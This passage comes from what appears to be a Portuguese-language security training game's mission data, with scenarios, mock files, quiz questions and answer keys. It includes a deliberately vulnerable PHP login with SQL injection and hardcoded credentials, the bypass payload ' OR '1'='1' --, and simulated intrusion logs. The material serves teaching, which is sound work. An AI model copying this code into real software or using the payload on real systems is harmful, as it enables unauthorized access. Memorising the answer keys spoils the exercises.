      "/var/log/nginx/access.log": `192.168.1.50 - - [15/Jan/2024:09:00:01] "GET /.env HTTP/1.1" 200 1847
192.168.1.50 - - [15/Jan/2024:09:00:05] "GET /.git/config HTTP/1.1" 200 312
203.0.113.45 - - [15/Jan/2024:09:01:22] "GET /.env HTTP/1.1" 200 1847
203.0.113.45 - - [15/Jan/2024:09:01:25] "GET /docker-compose.yml HTTP/1.1" 200 589
185.220.101.3 - - [15/Jan/2024:09:02:01] "GET /.env HTTP/1.1" 200 1847`,
      "/var/www/html/app/README.md": `# FinanceApp Backend
Deploy: sudo docker-compose up -d
Credenciais de emergência: admin/FinEmerg#2024`
    },
    perguntas: [
      {
        id: 1,
        texto: "Qual arquivo representa o vazamento mais crítico e por quê?",
        opcoes: [
          { id: "a", texto: "README.md — expõe credenciais de emergência" },
          { id: "b", texto: ".env — expõe chaves AWS reais, Stripe live key, senha do BD de produção e JWT secret" },
          { id: "c", texto: "docker-compose.yml — expõe senhas do MySQL e Redis" },
          { id: "d", texto: ".git/COMMIT_EDITMSG — revela que houve commit acidental de credenciais" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Correto! O .env contém: chaves AWS reais (acesso à infraestrutura de nuvem), Stripe live key (acesso a dinheiro real de clientes), senha do banco de produção, e JWT secret. Um único arquivo que compromete toda a infraestrutura e dados financeiros.",
        feedback_errado: "Embora vários arquivos sejam críticos, o .env concentra as credenciais mais destrutivas: AWS (infraestrutura), Stripe live (dinheiro real), banco de produção (todos os dados). É o 'jackpot' de um atacante."
      },
      {
        id: 2,
        texto: "O access.log mostra IPs externos acessando /.env com resposta 200. O que isso significa?",
        opcoes: [
          { id: "a", texto: "É normal — o .env é um arquivo público da aplicação" },
          { id: "b", texto: "Atacantes externos já leram o arquivo .env com todas as credenciais" },
          { id: "c", texto: "O nginx está redirecionando requisições suspeitas" },
          { id: "d", texto: "São bots de monitoramento verificando a saúde da aplicação" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Perfeito! Código 200 significa que os arquivos foram entregues com sucesso. Três IPs diferentes (sendo um da rede interna) já baixaram o .env. Isso não é suspeita — é confirmação de comprometimento. As credenciais já foram roubadas.",
        feedback_errado: "HTTP 200 = arquivo entregue com sucesso. Três IPs externos fizeram GET em /.env e receberam o conteúdo completo (1847 bytes = tamanho do .env). As credenciais já estão nas mãos de atacantes."
      },
      {
        id: 3,
        texto: "O debug.log em /tmp contém número completo de cartão de crédito, CVV e CPF. Qual violação isso representa?",
        opcoes: [
          { id: "a", texto: "Apenas um problema de performance — logs grandes são ineficientes" },
          { id: "b", texto: "Violação do PCI-DSS (dados de cartão), LGPD (CPF/dados pessoais) e má prática de desenvolvimento" },
          { id: "c", texto: "É aceitável em ambiente de debug durante desenvolvimento" },
          { id: "d", texto: "O arquivo está em /tmp, então é temporário e não representa risco" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Correto! PCI-DSS proíbe explicitamente log de CVV e número completo de cartão. LGPD exige proteção de CPF e dados pessoais. Isso pode gerar multas milionárias, cancelamento do contrato com operadoras de cartão, e responsabilidade civil.",
        feedback_errado: "PCI-DSS (Payment Card Industry) proíbe TERMINANTEMENTE log de CVV — é requisito 3.2. LGPD protege CPF como dado pessoal sensível. 'Está em /tmp' não protege: /tmp é acessível por outros processos e pode ser indexado por scripts de backup."
      }
    ],
    conclusao: {
      o_que_aconteceu: "A aplicação expunha via web arquivos sensíveis (.env, .git, docker-compose.yml). O arquivo .env continha credenciais reais de AWS, Stripe e banco de produção. Logs de debug armazenavam dados de cartão completos e CPFs. O access.log confirma que atacantes já acessaram e baixaram as credenciais.",
      vulnerabilidade: "OWASP A02:2021 - Falhas Criptográficas + A05:2021 - Configuração Incorreta de Segurança. Credenciais em texto plano expostas via web, dados sensíveis em logs, arquivos de configuração no webroot.",
      risco: "Comprometimento total da infraestrutura AWS, fraudes financeiras via Stripe API, exfiltração de todos os dados de clientes, multas por violação de PCI-DSS e LGPD, danos reputacionais irreversíveis.",
      como_corrigir: "1. Rotacione IMEDIATAMENTE todas as credenciais expostas (AWS, Stripe, BD)\n2. Bloqueie acesso web a .env, .git, docker-compose.yml via nginx\n3. Mova .env para fora do webroot\n4. Desative APP_DEBUG em produção\n5. Nunca logue dados de cartão (CVV proibido pelo PCI-DSS)\n6. Use secrets managers (AWS Secrets Manager, HashiCorp Vault)",
      boa_pratica: "Regra 12-factor app: configurações via variáveis de ambiente, nunca em código ou arquivos comitados. Adicione .env ao .gitignore. Use 'git-secrets' para prevenir commits acidentais de credenciais. Realize varreduras automáticas com TruffleHog ou GitLeaks no CI/CD."
    }
  },

  {
    id: 6,
    titulo: "Força Bruta — Defesa",
    subtitulo: "Implantando mecanismos de proteção",
    dificuldade: "Difícil",
    tipo: "multipla_escolha",
    pontos_maximos: 200,
    icone: "🛡️",
    contexto: `Você é o responsável de segurança da plataforma <strong>CloudShop</strong>, um e-commerce com 500.000 clientes.
Seu SIEM disparou um alerta: nas últimas 2 horas, foram detectadas <strong>847.293 tentativas de login</strong>
originadas de 12.000 IPs diferentes, em velocidade de ~7.000 req/s.
Você precisa <strong>tomar decisões de defesa em tempo real</strong>.`,
    dica: "Considere o impacto nos usuários legítimos, a eficácia de cada medida e a velocidade de implementação.",
    perguntas: [
      {
        id: 1,
        texto: "O ataque usa 12.000 IPs diferentes (botnet). Qual estratégia de bloqueio é mais eficaz?",
        opcoes: [
          { id: "a", texto: "Bloquear todos os 12.000 IPs individualmente no firewall" },
          { id: "b", texto: "Implementar rate limiting por IP + CAPTCHA após 3 falhas + bloqueio temporário progressivo" },
          { id: "c", texto: "Desativar o login para todos os usuários até o ataque cessar" },
          { id: "d", texto: "Não fazer nada — o sistema vai aguentar" }
        ],
        correta: "b",
        pontos: 60,
        feedback_correto: "Correto! Rate limiting reduz a velocidade do ataque sem bloquear usuários legítimos. CAPTCHA torna automação custosa. Bloqueio progressivo (5min, 30min, 24h) pune reincidentes. Uma combinação de camadas é sempre mais eficaz.",
        feedback_errado: "Bloquear 12.000 IPs é ineficaz (o atacante adiciona mais), desativar o login afeta clientes reais. A estratégia correta combina rate limiting (reduz velocidade), CAPTCHA (torna automação cara) e bloqueio progressivo."
      },
      {
        id: 2,
        texto: "Você implementou MFA obrigatório. Por que isso neutraliza efetivamente ataques de força bruta em senhas?",
        opcoes: [
          { id: "a", texto: "O MFA deixa os usuários mais lentos para logar, atrasando o ataque" },
          { id: "b", texto: "Mesmo que o atacante descubra a senha correta, ainda precisa do segundo fator (que só o usuário legítimo tem)" },
          { id: "c", texto: "O MFA bloqueia IPs suspeitos automaticamente" },
          { id: "d", texto: "O MFA criptografa as senhas de forma mais forte" }
        ],
        correta: "b",
        pontos: 60,
        feedback_correto: "Exato! Com MFA, descobrir a senha é apenas metade do caminho. O atacante ainda precisa do TOTP (código de 30s), SMS ou chave física — que apenas o usuário legítimo possui. Força bruta na senha torna-se inútil.",
        feedback_errado: "MFA cria uma segunda camada independente da senha. Se um atacante força bruta e descobre 'senha123', ainda precisa do código TOTP que muda a cada 30 segundos ou da chave física. A senha comprometida sozinha não concede acesso."
      },
      {
        id: 3,
        texto: "Após conter o ataque, você descobre que 3.200 contas foram comprometidas por credential stuffing (senhas reutilizadas de outros vazamentos). Qual deve ser a PRIMEIRA ação?",
        opcoes: [
          { id: "a", texto: "Enviar e-mail para os 3.200 usuários pedindo para trocarem a senha quando possível" },
          { id: "b", texto: "Forçar logout e reset de senha para as 3.200 contas comprometidas imediatamente, notificar os usuários e reportar o incidente" },
          { id: "c", texto: "Monitorar as contas comprometidas por 48h antes de agir" },
          { id: "d", texto: "Desativar permanentemente as 3.200 contas para proteger os dados" }
        ],
        correta: "b",
        pontos: 80,
        feedback_correto: "Correto! Resposta a incidente padrão: contenção imediata (forçar logout/reset elimina o acesso do atacante agora), notificação dos usuários (transparência e LGPD exigem), reporte do incidente (obrigação legal em 72h pela LGPD/GDPR).",
        feedback_errado: "Cada minuto com contas comprometidas ativas é um minuto que o atacante pode exfiltrar dados, fazer compras fraudulentas ou causar danos. Ação imediata é crucial. E-mail 'quando possível' é inadequado — a contenção deve ser instantânea."
      }
    ],
    conclusao: {
      o_que_aconteceu: "Um ataque de credential stuffing em larga escala usou uma botnet de 12.000 IPs para testar 847.293 combinações de login em 2 horas. 3.200 contas foram comprometidas pois seus usuários reutilizavam senhas de vazamentos anteriores (HaveIBeenPwned).",
      vulnerabilidade: "Ausência de: rate limiting, MFA obrigatório, detecção de credential stuffing, verificação de senhas comprometidas no cadastro, alertas de login suspeito.",
      risco: "Contas comprometidas permitem: fraudes financeiras, roubo de dados pessoais (LGPD), danos à reputação da plataforma, responsabilidade legal.",
      como_corrigir: "1. Implemente MFA — torna credential stuffing ineficaz\n2. Verifique senhas contra HaveIBeenPwned API no cadastro e login\n3. Rate limiting + CAPTCHA progressivo\n4. Alertas de login de novo dispositivo/localização\n5. Monitoramento SIEM com alertas de anomalia",
      boa_pratica: "Zero-trust em autenticação: nunca confie apenas na senha. MFA + senhas verificadas contra vazamentos conhecidos + anomaly detection = conjunto mínimo para plataformas com dados sensíveis. Notifique usuários proativamente sobre logins suspeitos."
    }
  },

  {
    id: 7,
    titulo: "DDoS — Mitigação",
    subtitulo: "Respondendo a um ataque volumétrico",
    dificuldade: "Difícil",
    tipo: "multipla_escolha",
    pontos_maximos: 200,
    icone: "🌊",
    contexto: `Você é o engenheiro de segurança de plantão na <strong>NetBank Digital</strong>.
São 14h de uma sexta-feira. Seu sistema de monitoramento alerta:
<strong>O tráfego aumentou de 500 Mbps para 47 Gbps em 3 minutos.</strong>
A aplicação está fora do ar. Clientes não conseguem acessar o internet banking.
O time está aguardando sua análise e decisões.`,
    dica: "Um DDoS volumétrico busca esgotar largura de banda ou recursos do servidor. Pense em camadas de defesa.",
    perguntas: [
      {
        id: 1,
        texto: "Qual é a natureza deste ataque baseado nos dados de monitoramento?",
        opcoes: [
          { id: "a", texto: "Ataque de força bruta no servidor de login do banco" },
          { id: "b", texto: "Ataque DDoS volumétrico — tráfego 94x acima do normal visa saturar a conexão de internet" },
          { id: "c", texto: "Falha no servidor de banco de dados" },
          { id: "d", texto: "Pico de tráfego legítimo de clientes" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Correto! 47 Gbps em 3 minutos (94x o normal) é característico de DDoS volumétrico — provavelmente UDP flood, ICMP flood ou amplificação DNS/NTP. O objetivo é saturar o link de internet do banco, não explorar uma vulnerabilidade específica.",
        feedback_errado: "A escala (47 Gbps em 3 minutos, aumento de 94x) descarta tráfego legítimo. A velocidade de escalada e o volume apontam para DDoS volumétrico — possivelmente tráfego amplificado via DNS ou NTP reflection."
      },
      {
        id: 2,
        texto: "Qual medida técnica tem MAIOR impacto imediato na mitigação de um DDoS volumétrico?",
        opcoes: [
          { id: "a", texto: "Reiniciar o servidor web para limpar as conexões" },
          { id: "b", texto: "Ativar serviço de mitigação DDoS na borda (CDN/scrubbing center) para filtrar o tráfego malicioso antes de chegar ao datacenter" },
          { id: "c", texto: "Aumentar a RAM do servidor" },
          { id: "d", texto: "Bloquear todos os IPs estrangeiros no firewall" }
        ],
        correta: "b",
        pontos: 70,
        feedback_correto: "Correto! Um scrubbing center (Cloudflare, AWS Shield, Akamai) absorve o tráfego malicioso na nuvem, antes de chegar ao link do banco. Apenas tráfego limpo é encaminhado. É a única solução que funciona contra 47 Gbps — seu link de 10 Gbps já está saturado.",
        feedback_errado: "Reiniciar servidor não resolve saturação de link. Adicionar RAM não ajuda. Bloquear IPs estrangeiros é ineficaz (botnets usam IPs globais incluindo brasileiros). A solução é desviar o tráfego para um scrubbing center que absorve o ataque antes do seu datacenter."
      },
      {
        id: 3,
        texto: "Após mitigar o DDoS, a análise revela que foi usada como distração enquanto uma tentativa de SQL injection ocorria no sistema de pagamentos. Qual lição de segurança isso demonstra?",
        opcoes: [
          { id: "a", texto: "DDoS e SQL injection são sempre usados juntos — ambos são o mesmo tipo de ataque" },
          { id: "b", texto: "Atacantes sofisticados usam DDoS como cortina de fumaça para cobrir ataques mais sutis — defesa em profundidade é essencial" },
          { id: "c", texto: "O DDoS foi acidental e não tem relação com o SQL injection" },
          { id: "d", texto: "SQL injection é menos perigoso que DDoS, portanto pode ser ignorado" }
        ],
        correta: "b",
        pontos: 80,
        feedback_correto: "Análise excelente! 'DDoS como cortina de fumaça' (smoke screen attack) é uma técnica documentada: o DDoS ocupa toda a atenção do time de segurança e sobrecarrega sistemas de logging, enquanto o ataque real (SQL injection, data exfiltration) ocorre despercebido.",
        feedback_errado: "DDoS como cortina de fumaça é um vetor de ataque combinado documentado. Enquanto o time luta contra o DDoS, logs ficam saturados, alertas se perdem e a atenção humana está dividida — o momento perfeito para um ataque mais cirúrgico no backend."
      }
    ],
    conclusao: {
      o_que_aconteceu: "Um atacante (provavelmente um grupo organizado) usou um DDoS volumétrico de 47 Gbps como distração para tentar explorar SQL injection no sistema de pagamentos. A disponibilidade foi comprometida por horas. Sem monitoramento multicamada, o ataque real poderia ter passado despercebido.",
      vulnerabilidade: "Ausência de: serviço anti-DDoS contratado previamente, monitoramento de WAF ativo durante o incidente, playbook de resposta a incidentes DDoS, visibilidade nas camadas de aplicação durante ataques volumétricos.",
      risco: "Indisponibilidade do internet banking (prejuízo financeiro, reputacional), possível exfiltração de dados via SQL injection, violação regulatória (Banco Central exige RTO/RPO para serviços financeiros digitais).",
      como_corrigir: "1. Contrate solução anti-DDoS sempre ativa (não apenas quando o ataque começa)\n2. Implemente WAF (Web Application Firewall) com regras anti-SQL injection\n3. Crie playbook de resposta a incidentes DDoS com papéis definidos\n4. Separe o monitoramento de DDoS do monitoramento de aplicação\n5. Conduza exercícios (DDoS tabletop) com o time",
      boa_pratica: "Defesa em profundidade (Defense in Depth): múltiplas camadas de segurança independentes. Anti-DDoS na borda, WAF na camada de aplicação, IDS/IPS na rede interna, monitoramento de comportamento no banco de dados. Nenhuma camada isolada é suficiente."
    }
  },

  {
    id: 8,
    titulo: "Autenticação Insegura",
    subtitulo: "Auditando o sistema de login",
    dificuldade: "Difícil",
    tipo: "browser",
    pontos_maximos: 200,
    icone: "🌐",
    contexto: `Você foi contratado para realizar um <strong>Code Review de Segurança</strong> do sistema de autenticação
da startup <strong>MedConnect</strong> — uma plataforma de saúde digital com dados de pacientes.
Analise o código do sistema de login e identifique todas as vulnerabilidades.`,
    dica: "Procure por: SQL Injection, senhas em texto plano, tokens previsíveis, ausência de controles de segurança.",
    codigo_fonte: {
      "login.php": `<?php
// login.php — Sistema de Autenticação MedConnect
session_start();

if ($_POST['action'] == 'login') {
    $db = mysqli_connect("localhost", "root", "admin123", "medconnect");

    // Verificação de login
    $user = $_POST['username'];
    $pass = $_POST['password'];

    // Query de autenticação
    $query = "SELECT * FROM users WHERE username='$user' AND password='$pass'";
    $result = mysqli_query($db, $query);

    if (mysqli_num_rows($result) > 0) {
        $row = mysqli_fetch_assoc($result);
        $_SESSION['user_id'] = $row['id'];
        $_SESSION['username'] = $row['username'];
        $_SESSION['role'] = $row['role'];

        // Token de sessão simples
        $_SESSION['token'] = $row['id'] . '_' . time();

        // Log sem sanitização
        file_put_contents('/var/log/app.log',
            "Login: $user | Pass: $pass | IP: " . $_SERVER['REMOTE_ADDR'] . "\\n",
            FILE_APPEND
        );

        header("Location: dashboard.php");
    } else {
        // Mensagem de erro específica
        $error = "Usuário '$user' não encontrado ou senha incorreta";
        echo "<script>alert('$error')</script>";
    }
}
?>
<!DOCTYPE html>
<html>
<head><title>MedConnect - Login</title></head>
<body>
<form method="POST">
    <input type="hidden" name="action" value="login">
    <input type="text" name="username" placeholder="Usuário">
    <input type="text" name="password" placeholder="Senha" type="text">
    <input type="submit" value="Entrar">
</form>
<!-- TODO: remover antes do deploy
     Conta de teste: admin / admin123
     DB: root / admin123 -->
</body>
</html>`,
      "dashboard.php": `<?php
session_start();
// Verificação de autenticação
if (!isset($_SESSION['user_id'])) {
    header("Location: login.php");
}
// Sem verificação de expiração de sessão
// Sem validação de token
$user_id = $_GET['id']; // ID do usuário da URL
$query = "SELECT * FROM patients WHERE doctor_id = $user_id";
?>`
    },
    perguntas: [
      {
        id: 1,
        texto: "A query '$query = \"SELECT * FROM users WHERE username=\'$user\' AND password=\'$pass\'\"' é vulnerável a qual ataque clássico?",
        opcoes: [
          { id: "a", texto: "Cross-Site Scripting (XSS)" },
          { id: "b", texto: "SQL Injection — entrada não sanitizada concatenada diretamente na query" },
          { id: "c", texto: "Command Injection no servidor" },
          { id: "d", texto: "Buffer Overflow no banco de dados" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Correto! Inserindo username = ' OR '1'='1' -- , a query vira: SELECT * FROM users WHERE username='' OR '1'='1' -- AND password='...' — que retorna todos os usuários, concedendo acesso sem senha. Clássico SQL Injection.",
        feedback_errado: "A vulnerabilidade é SQL Injection. Se um atacante digitar no campo usuário: ' OR '1'='1' --  a query resultante ignora a verificação de senha completamente. A concatenação direta de input do usuário em queries SQL é sempre insegura."
      },
      {
        id: 2,
        texto: "O código loga 'Pass: $pass' (a senha em texto plano nos logs). Além da exposição da senha, qual OUTRA vulnerabilidade isso cria?",
        opcoes: [
          { id: "a", texto: "Logs muito grandes tornam o servidor lento" },
          { id: "b", texto: "Qualquer pessoa com acesso aos logs obtém todas as senhas; viola LGPD e PCI-DSS; impede que usuários usem a mesma senha em outros serviços com segurança" },
          { id: "c", texto: "O arquivo de log pode ficar corrompido" },
          { id: "d", texto: "É apenas um problema de privacidade menor" }
        ],
        correta: "b",
        pontos: 70,
        feedback_correto: "Análise completa! Logs com senhas: qualquer sysadmin lê as senhas de todos, backups de logs expõem credenciais, rotação de logs significa senhas históricas espalhadas pelo sistema. LGPD e PCI-DSS proíbem explicitamente o armazenamento de senhas em qualquer forma legível.",
        feedback_errado: "Senhas em logs violam: (1) LGPD — dado sensível armazenado desnecessariamente, (2) PCI-DSS — dado de autenticação em texto, (3) segurança — qualquer sysadmin com acesso a /var/log tem as senhas de todos. Logs nunca devem conter credenciais."
      },
      {
        id: 3,
        texto: "O campo 'password' no HTML é do tipo 'text' (não 'password'). Além de mostrar a senha na tela, quais outros riscos isso cria?",
        opcoes: [
          { id: "a", texto: "Nenhum risco adicional — é apenas visual" },
          { id: "b", texto: "A senha fica visível para shoulder surfing, é armazenada pelo autocompletar do browser, fica visível em gravações de tela e capturas de tela" },
          { id: "c", texto: "O campo texto é mais rápido de processar que o campo password" },
          { id: "d", texto: "Apenas usuários com dificuldade de digitação se beneficiariam" }
        ],
        correta: "b",
        pontos: 80,
        feedback_correto: "Exato! type='text' para senha: aparece em shoulder surfing (alguém olhando a tela), é salva pelo autocompletar como texto normal, aparece em gravações de suporte/demonstração, capturada por keyloggers que rastreiam campos de texto. type='password' é um controle de segurança obrigatório.",
        feedback_errado: "type='password' existe por razões de segurança reais: mascara da visão de terceiros (shoulder surfing), previne captura por alguns keyloggers, sinaliza ao browser para não fazer autocomplete público, e não aparece em 'salvar senha como texto' no cache do browser."
      }
    ],
    conclusao: {
      o_que_aconteceu: "O sistema de autenticação da MedConnect tinha múltiplas vulnerabilidades críticas: SQL injection permitindo bypass de autenticação, senhas armazenadas em texto plano nos logs, token de sessão previsível (user_id + timestamp), campo de senha como texto visível, e credenciais hardcoded em comentário HTML público.",
      vulnerabilidade: "OWASP Top 10: A03 - SQL Injection, A07 - Falhas de Identificação e Autenticação, A09 - Falhas de Log. Combinação de falhas elementares em um sistema com dados de saúde (extremamente sensíveis pela LGPD).",
      risco: "Bypass total de autenticação via SQL injection, exposição de dados de saúde de pacientes, violação grave da LGPD (dados de saúde são categoria especial), comprometimento de credenciais de todos os usuários via logs.",
      como_corrigir: "1. Use Prepared Statements/PDO para queries (eliminam SQL injection)\n2. Nunca logue senhas — logue apenas username e timestamp\n3. Armazene senhas com bcrypt/Argon2 (nunca texto plano)\n4. Use tokens de sessão criptograficamente seguros (random_bytes)\n5. type='password' obrigatório em campos de senha\n6. Remova comentários com credenciais do HTML",
      boa_pratica: "OWASP ASVS (Application Security Verification Standard) define requisitos mínimos de autenticação segura. Use frameworks que implementam segurança por padrão (Laravel, Django) ao invés de código de autenticação manual. Realize code review focado em segurança antes de qualquer deploy em produção."
    }
  }
,

  // ─── MISSÃO 9 ─────────────────────────────────────────────────────────────
  {
    id: 9,
    titulo: "Firewall com iptables",
    subtitulo: "Protegendo um servidor Linux com regras de firewall",
    dificuldade: "Difícil",
    tipo: "terminal",
    pontos_maximos: 200,
    icone: "🧱",
    contexto: `Você foi contratado como analista de segurança pela <strong>LogiTrans Ltda</strong>.
O servidor de produção está exposto à internet <strong>sem nenhuma regra de firewall</strong>.
Logs mostram tentativas de invasão nas últimas 24h. Sua missão: <strong>analisar as regras
existentes e definir a política correta de firewall com iptables</strong>.`,
    dica: "Use <code>cat /etc/iptables/rules.v4</code> para ver as regras atuais e <code>cat /var/log/firewall.log</code> para ver os ataques.",
    filesystem: {
      "/": ["etc", "var", "home"],
      "/etc": ["iptables", "nginx"],
      "/etc/iptables": ["rules.v4", "rules.v6"],
      "/etc/nginx": ["nginx.conf"],
      "/var": ["log"],
      "/var/log": ["firewall.log", "auth.log", "syslog"],
      "/home": ["analista"]
    },
    files: {
      "/etc/iptables/rules.v4": `# iptables — LogiTrans Servidor de Produção
# Gerado em: 2024-01-15 08:00:00
# ATENÇÃO: Configuração padrão — INSEGURA

*filter
:INPUT ACCEPT [0:0]
:FORWARD DROP [0:0]
:OUTPUT ACCEPT [0:0]

# Loopback (obrigatório)
-A INPUT -i lo -j ACCEPT

# Conexões estabelecidas
-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# TODO: adicionar regras de segurança aqui

COMMIT

# STATUS: Política INPUT = ACCEPT (aceita TUDO — qualquer porta, qualquer IP)
# PORTAS ABERTAS: 21(FTP), 22(SSH), 23(Telnet), 80(HTTP), 443(HTTPS), 3306(MySQL), 5432(Postgres), 8080(dev), todas as demais`,
      "/etc/iptables/rules.v6": `# ip6tables — IPv6 (não utilizado — deve ser bloqueado)
*filter
:INPUT ACCEPT [0:0]
:FORWARD DROP [0:0]
:OUTPUT ACCEPT [0:0]
COMMIT`,
      "/var/log/firewall.log": `Jan 15 02:14:33 logitrans kernel: [UFW AUDIT] IN=eth0 SRC=45.33.32.156 DST=203.0.113.10 PROTO=TCP DPT=23 (Telnet scan)
Jan 15 02:14:51 logitrans kernel: [UFW AUDIT] IN=eth0 SRC=45.33.32.156 DST=203.0.113.10 PROTO=TCP DPT=3306 (MySQL direto)
Jan 15 02:15:01 logitrans kernel: [UFW AUDIT] IN=eth0 SRC=185.220.101.3 DST=203.0.113.10 PROTO=TCP DPT=22 (SSH brute force)
Jan 15 02:15:02 logitrans kernel: [UFW AUDIT] IN=eth0 SRC=185.220.101.3 DST=203.0.113.10 PROTO=TCP DPT=22
Jan 15 02:15:03 logitrans kernel: [UFW AUDIT] IN=eth0 SRC=185.220.101.3 DST=203.0.113.10 PROTO=TCP DPT=22
Jan 15 02:15:04 logitrans kernel: [UFW AUDIT] IN=eth0 SRC=185.220.101.3 DST=203.0.113.10 PROTO=TCP DPT=22
Jan 15 02:15:05 logitrans kernel: [UFW AUDIT] IN=eth0 SRC=185.220.101.3 DST=203.0.113.10 PROTO=TCP DPT=22
Jan 15 03:22:10 logitrans kernel: [UFW AUDIT] IN=eth0 SRC=103.21.244.0 DST=203.0.113.10 PROTO=TCP DPT=8080 (servidor dev exposto)
Jan 15 03:22:15 logitrans kernel: [UFW AUDIT] IN=eth0 SRC=103.21.244.0 DST=203.0.113.10 PROTO=TCP DPT=5432 (Postgres exposto)
Jan 15 06:00:01 logitrans kernel: [UFW AUDIT] IN=eth0 SRC=198.51.100.22 DST=203.0.113.10 PROTO=TCP DPT=21 (FTP — protocolo legado inseguro)`,
      "/var/log/auth.log": `Jan 15 02:15:01 logitrans sshd[3821]: Failed password for root from 185.220.101.3 port 54213 ssh2
Jan 15 02:15:02 logitrans sshd[3822]: Failed password for root from 185.220.101.3 port 54214 ssh2
Jan 15 02:15:03 logitrans sshd[3823]: Failed password for admin from 185.220.101.3 port 54215 ssh2
Jan 15 02:15:04 logitrans sshd[3824]: Failed password for ubuntu from 185.220.101.3 port 54216 ssh2
Jan 15 02:15:05 logitrans sshd[3825]: Failed password for pi from 185.220.101.3 port 54217 ssh2
Jan 15 02:15:06 logitrans sshd[3826]: Accepted password for analista from 185.220.101.3 port 54218 ssh2
# ALERTA: SSH comprometido — senha fraca descoberta por brute force`,
      "/etc/nginx/nginx.conf": `server {
    listen 80;
    listen 443 ssl;
    server_name logitrans.com.br;
    root /var/www/html;
}
# Porta 8080 — ambiente de dev exposto em produção (RISCO)`
    },
    perguntas: [
      {
        id: 1,
        texto: "O arquivo rules.v4 mostra política INPUT=ACCEPT e portas 23 (Telnet) e 3306 (MySQL) abertas para internet. Qual é a configuração CORRETA de política padrão para um firewall seguro?",
        opcoes: [
          { id: "a", texto: "Manter INPUT ACCEPT e bloquear apenas IPs conhecidos maliciosos" },
          { id: "b", texto: "Mudar para INPUT DROP (bloqueia tudo) e criar regras ACCEPT apenas para portas necessárias: 22, 80, 443" },
          { id: "c", texto: "Manter INPUT ACCEPT mas instalar antivírus no servidor" },
          { id: "d", texto: "Usar OUTPUT DROP e manter INPUT ACCEPT — o tráfego de saída é mais perigoso" }
        ],
        correta: "b",
        pontos: 60,
        feedback_correto: "Correto! Princípio do menor privilégio aplicado a firewall: bloqueie TUDO por padrão (INPUT DROP) e libere explicitamente apenas o necessário. Telnet (23) deve ser desativado — usa texto plano. MySQL (3306) nunca deve estar acessível da internet — use tunnel SSH.",
        feedback_errado: "A abordagem correta é 'default deny': INPUT DROP bloqueia tudo, depois você adiciona regras ACCEPT específicas. Bloquear apenas IPs maliciosos conhecidos é ineficaz — existem bilhões de IPs potencialmente maliciosos. Portas como Telnet (23) e MySQL (3306) nunca devem ser expostas à internet."
      },
      {
        id: 2,
        texto: "O log mostra 5 tentativas de SSH em 5 segundos do IP 185.220.101.3 — brute force clássico. Qual regra iptables limita tentativas de conexão SSH para prevenir isso?",
        opcoes: [
          { id: "a", texto: "-A INPUT -p tcp --dport 22 -j DROP (bloquear SSH completamente)" },
          { id: "b", texto: "-A INPUT -p tcp --dport 22 -m recent --name SSH --update --seconds 60 --hitcount 5 -j DROP (rate limiting: máx 5 tentativas por minuto)" },
          { id: "c", texto: "-A INPUT -s 185.220.101.3 -j DROP (bloquear apenas esse IP)" },
          { id: "d", texto: "-A INPUT -p tcp --dport 22 -m state --state NEW -j ACCEPT (aceitar conexões novas)" }
        ],
        correta: "b",
        pontos: 80,
        feedback_correto: "Perfeito! O módulo '--recent' do iptables rastreia tentativas por IP. '--hitcount 5 --seconds 60' significa: se o mesmo IP fizer 5 conexões em 60 segundos, bloqueia. Isso não derruba SSH legítimo (usuário normal faz 1-2 tentativas) mas inviabiliza brute force automatizado.",
        feedback_errado: "Bloquear o SSH completamente (-j DROP na porta 22) impede o administrador de acessar o servidor. Bloquear apenas um IP fixo é ineficaz (botnet usa milhares de IPs). A solução correta é rate limiting com '--recent': limita tentativas por IP sem bloquear acesso legítimo."
      },
      {
        id: 3,
        texto: "Além de iptables, o servidor expõe porta 8080 (servidor de desenvolvimento) e FTP (21). Qual abordagem de hardening complementa o firewall?",
        opcoes: [
          { id: "a", texto: "Deixar as portas abertas mas monitorar com antivírus" },
          { id: "b", texto: "Desativar serviços desnecessários no sistema (systemctl disable ftp), usar SSH em vez de FTP, remover servidor de dev da produção, e implementar fail2ban para automação de bloqueio" },
          { id: "c", texto: "Mudar as portas para números altos (ex: FTP na porta 2121) para esconder do scanner" },
          { id: "d", texto: "Adicionar senha nos serviços FTP e dev server — assim ficam seguros mesmo abertos" }
        ],
        correta: "b",
        pontos: 60,
        feedback_correto: "Excelente! Firewall é uma camada, não a solução completa. Defense in depth: (1) desative serviços não usados — superfície de ataque zero, (2) substitua protocolos inseguros (FTP→SFTP), (3) separe ambientes dev/prod, (4) fail2ban automatiza bloqueio de IPs agressivos baseado nos logs.",
        feedback_errado: "Security through obscurity (mudar porta) não é segurança — scanners como nmap detectam serviços em qualquer porta. Adicionar senha não resolve protocolo inseguro como FTP (transmite senha em texto plano). A solução correta é eliminar a superfície de ataque: desative o que não usa."
      }
    ],
    conclusao: {
      o_que_aconteceu: "O servidor da LogiTrans estava completamente desprotegido: política INPUT ACCEPT aceitava qualquer conexão, Telnet e MySQL expostos à internet, brute force SSH bem-sucedido (senha fraca descoberta), e servidor de desenvolvimento acessível publicamente.",
      vulnerabilidade: "Ausência de firewall configurado, princípio do menor privilégio não aplicado, serviços legados (FTP, Telnet) ativos, ambiente de desenvolvimento misturado com produção, sem rate limiting para SSH.",
      risco: "Comprometimento total do servidor: acesso root via SSH brute force, acesso direto ao banco de dados MySQL, exposição de dados de desenvolvimento, possibilidade de persistência (backdoor).",
      como_corrigir: "1. iptables INPUT DROP por padrão, ACCEPT apenas nas portas 22, 80, 443\n2. Rate limiting SSH com módulo --recent\n3. Desabilitar Telnet, FTP — substituir por SSH/SFTP\n4. MySQL nunca exposto à internet — acesso apenas via 127.0.0.1\n5. Instalar fail2ban para automação\n6. Separar ambiente dev de produção\n7. Salvar regras com iptables-save",
      boa_pratica: "Princípio do menor privilégio aplicado a redes: um servidor web precisa apenas das portas 80 e 443 abertas ao mundo. SSH deve ser acessível apenas de IPs específicos (lista branca). Ferramentas como fail2ban, UFW (front-end do iptables) e nftables modernizam a gestão de firewall Linux."
    }
  },

  // ─── MISSÃO 10 ────────────────────────────────────────────────────────────
  {
    id: 10,
    titulo: "DNS e Certificado SSL",
    subtitulo: "Configurando domínio seguro com HTTPS para um site em produção",
    dificuldade: "Difícil",
